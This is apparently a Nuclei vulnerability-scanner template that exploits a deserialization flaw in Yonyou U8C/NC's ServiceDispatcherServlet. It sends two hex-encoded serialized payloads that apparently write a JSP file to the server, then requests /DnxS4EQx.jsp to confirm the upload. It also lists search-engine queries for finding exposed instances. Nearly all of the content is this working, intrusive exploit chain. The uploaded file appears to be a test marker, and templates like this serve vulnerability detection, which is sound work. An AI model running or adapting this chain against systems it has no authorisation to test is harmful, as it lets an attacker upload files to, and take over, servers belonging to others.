id: yonyou-u8c-IFileTrans-deserialization-fileupload

info:
  name: Yonyou NC IFileTrans deserialization - Arbitrary File Upload
  author: adeljck
  severity: critical
  description: |
    Yonyou NC ServiceDispatcherServlet deserialization throgh nc.itf.hr.tools.IFileTrans Class file upload vulnerability.
  reference:
    - https://mp.weixin.qq.com/s/k7l1cq0UeT2vD2bSXZQIQw
    - https://github.com/adeljck/YongYou-Exploit
  classification:
    cpe: cpe:2.3:a:yonyou:u8c:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: yonyou
    product: u8c
    version: 5.0,5.01,5.011,5.02,5.3,5.5,5.6,5.7,5.75,6.0,6.1,6.3
    hunter-query: title:"U8C"
    fofa-query: app="用友-U8C"
  tags: yonyou,intrusive,fileupload,IFileTrans,deserialization

http:
  - raw:
      - |
        POST /ServiceDispatcherServlet HTTP/1.1
        Content-Type: application/data
        Host: {{Hostname}}
        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2

        {{hex_decode("0000024c727189017bb903db14fb963164bade124a6345abafa416d11a7798a49640e0cc877db0c28918805c6b48125e6da6cf72c3cd2ddc4cd2082a64824bfceb1b842b792e6ff985a7fb922c503467dba464d978f8e5676f9da6d01d66740f56563d4fc4a87a448b5c97fd79a132536bc60db0f92a35caa68f9cf51c4ceb331ffb5910acbecdf07886a2480ab6340690061d5bb80fbd59f93bc546a7c29299443c2cda287ff9d69d1948185e8cbf1d9e4d4982072f2337b06f35c6994eab5598e04c2c7c6942e117a1d099921a30ec747e88fe6b1d5b0ff4509c2581207b028568eab2e5a144b11b1effb318550e6f50403ff58c2a5280cacb807bfb866b97df06d6447769f73b2580b5173a8cd2f6229e7802c6756ea536b54ddd6ef08d435b2af8c2bad29fa0b2991d399a8eef69bb3a29d771920749419aab7f32e95da28a78df5a986db4ff7de469b2508d346c80d8bf156e17baa3757b4a334f4fed994fe66b0585736aea0a95bbd355e9a532f902d6c4eae2cbef83414981801836106e6d573cbfe8feeba3dfc62856cb140bc0a35ade72e4eabb3f312a8af6c66ddac446391673c8609a8f503a6489c277046016410b2169c9e00c87a17a9dec253bcd578d0a10adfb7f0feacd6c3c90f0d70f09f4488d2dcdb9139b0dd82e3429885fc02e5464b42f8f0a95bbd355e9a53223e87f2305aab5a5e50cce031fbe8555f902d6c4eae2cbefff2713a21b7385658a0e2cedee29decf7073747ccfd9dc29d8a7e5079d53a229a1dddaf5fc7eeb13a682cbe700db6dfbfbd7ee4294e5569cc6c793e343ac742fa84ab79552964f8b")}}
      - |
        POST /ServiceDispatcherServlet HTTP/1.1
        Content-Type: application/data
        Host: {{Hostname}}
        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2

        {{hex_decode("0000024c727189017bb903db14fb963164bade124a6345abafa416d11a7798a49640e0cc877db0c28918805c6b48125e6da6cf72c3cd2ddc4cd2082a64824bfceb1b842b792e6ff985a7fb922c503467dba464d978f8e5676f9da6d01d66740f56563d4fc4a87a448b5c97fd79a132536bc60db0f92a35caa68f9cf51c4ceb331ffb5910acbecdf07886a2480ab63406009292859b21482a1c9d4f33dba8b834037085d8dfbe522da1f905553a69d55dd4d1122c04eb147bfc673cb4e1a5d47eb25c75613f050f8573246216863b443680ccbea285f7b9cc623081c2d0eb7f6fcf157933837b3209cafb0263e847a6ca568ab1468af681be70457f97b38f3eee716d4e2ecc3557d083c97400ba42001b566cf48e895daee88df684b6c1085e9d223eef30d0003f53372fe597ebc063b7e7d14e8baf7c55e2866b8a1687dd53fd263f28160bf7ba7b02b629b03375a84ba0ac90893a49a3a9dd996ac8e343a9b1d1f67b8a7907a8e2b0b3f29d1bcb5466f902d6c4eae2cbef2bf3dc342967cba4c15605bf46bc76ececd3f71b76d3f77a858f1109e6bbc2e328c73b6558e46a49272f04cd308f36cd41e0ccff0f489fb88b9d5e391edae9ca250236ff55520a69879082c71cba52e16d95c6cb938c11f667d3004fa60af48c7380b6434435e9e92b87665977577d8f86e46a12655f37394a84fbd27568b2c84882a7c3037737e4f902d6c4eae2cbefa6e278ce52cfeb773d74a03dc140f31dcac2ab356a560fa31d8acea0330830555a40dfaa5cf45c393d28b88478c12f36eac58cfb08fb082adffc45e50b1a12e6712e59727c0f7361")}}
      - |
        GET /DnxS4EQx.jsp HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: or
    matchers:
    # check first response body length
      - type: dsl
        dsl:
          - "len(body_0) <= 299"
    # check second response body length
      - type: dsl
        dsl:
          - "len(body_1) <= 299"
      - type: dsl
        dsl:
          - "status_code_3 == 200 && contains(body_3, 'For Nuclei Test') && (contains(all_headers_3, 'Nuclei:Test') || contains(all_headers_3, 'Nuclei: Test'))"
